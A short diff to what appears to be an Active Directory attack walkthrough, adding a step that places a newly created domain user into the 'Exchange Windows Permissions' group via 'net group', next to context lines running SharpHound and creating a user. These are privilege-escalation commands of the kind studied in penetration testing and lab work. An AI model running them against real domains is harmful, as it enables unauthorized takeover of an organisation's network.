@@ -269,3 +269,7 @@ C:\> .\SharpHound.exe -c all
 ```CSS
 C:\> net user random passwd123 /add /domain
 ```
+  - Add the new user to the "Exchange Windows Permissions" group.
+```CSS
+C:\> net group "Exchange Windows Permissions" random /add /domain
+```
